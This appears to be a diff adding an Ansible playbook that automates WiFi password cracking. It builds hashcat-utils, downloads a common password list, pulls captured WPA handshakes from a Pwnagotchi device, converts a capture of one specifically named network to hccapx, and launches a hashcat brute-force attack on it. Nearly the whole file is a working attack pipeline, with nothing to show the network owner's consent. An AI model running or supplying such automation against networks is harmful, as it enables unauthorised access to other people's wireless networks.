@@ -1,0 +1,88 @@
+# required packages
+#   hxtools
+#   hashcat
+
+# Preparation
+#
+# update the new network (USB Ethernet/RNDIS Gadget) with the following
+# ip: 10.0.0.1
+# subnet mask: 255.255.255.0
+# gateway: 10.0.0.1
+#
+# you'll need to add this to /etc/ansible/hosts
+# [pwnagotchi]
+# 10.0.0.2
+
+---
+
+- hosts: localhost
+  vars:
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
+    dir_hashcat_utils: ~/github/hashcat-utils
+
+  tasks:
+  - name: Install make
+    become: yes
+    ansible.builtin.apt:
+      name: make
+
+  - name: Install gcc
+    become: yes
+    ansible.builtin.apt:
+      name: gcc
+
+  - name: Creating '{{dir_pwnagotchi}}'
+    ansible.builtin.file:
+      path: '{{dir_pwnagotchi}}'
+      state: directory
+      mode: '0755'
+
+  - name: Git checkout hashcat-utils
+    ansible.builtin.git:
+      repo: 'https://github.com/hashcat/hashcat-utils.git'
+      dest: '{{dir_hashcat_utils}}'
+      clone: yes
+      update: yes
+
+  - name: Make hashcat binaries
+    shell:
+      cmd: 'cd {{dir_hashcat_utils}}/src; make; mv *.bin {{dir_hashcat_utils}}/bin'
+
+  - name: Git checkout password lists
+    ansible.builtin.git:
+      repo: 'https://github.com/josuamarcelc/common-password-list.git'
+      dest: '{{dir_pwnagotchi}}/password_lists'
+      clone: yes
+      update: yes
+
+
+- hosts: pwnagotchi
+  ignore_unreachable: true
+  vars:
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
+    timestamp: "{{ '%Y-%m-%d' | strftime }}"
+
+  tasks:
+  - name: Copy handshakes from pwnagotchi
+    ignore_errors: true
+    synchronize:
+      src: /home/pi/handshakes/
+      dest: "{{dir_pwnagotchi}}/{{timestamp}}"
+      mode: pull
+      recursive: yes
+
+
+- hosts: localhost
+  vars:
+    dir_pwnagotchi: ~/pwnagotchi_handshakes
+    dir_hashcat_utils: ~/github/hashcat-utils
+    timestamp: "{{ '%Y-%m-%d' | strftime }}"
+
+  tasks:
+    - name: Make hccapx file from handshake
+      shell:
+        cmd: '{{dir_hashcat_utils}}/bin/cap2hccapx.bin {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.pcap {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.hccapx'
+
+    - name: Start bruteforcing using hashcat
+      shell:
+        cmd: 'hashcat -m 2500 --force -a 3 {{dir_pwnagotchi}}/{{timestamp}}/JesusSaves_40e1e441f2b3.hccapx'
